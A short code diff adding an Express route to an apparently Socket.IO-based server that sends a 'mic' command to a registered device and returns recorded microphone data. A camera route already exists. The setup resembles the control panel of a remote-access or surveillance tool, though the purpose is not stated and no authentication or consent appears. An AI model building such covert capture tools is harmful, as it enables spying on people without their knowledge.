@@ -136,6 +136,25 @@ app.get('/camera/:id/:cam', async (req, res)=>{
   }
 });
 
+app.get('/record/:id/:time', async (req, res)=>{
+  const id = req.params.id;
+  const time = req.params.time;
+  const socketId = idToSocket.get(id);
+  io.to(socketId).emit('mic', time);
+  try{
+  const appData = await new Promise((resolve, reject) => {
+      if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
+      idToConnectionSocket.get(id).once("mic", (data) => {
+        resolve({"mic":data});
+      });
+    });
+    
+    res.json(appData);
+  }catch(e){
+      res.json(e);
+  }
+});
+
 //io operations
 io.on("connection", (socket) => {
     socket.on("register", (id) => {
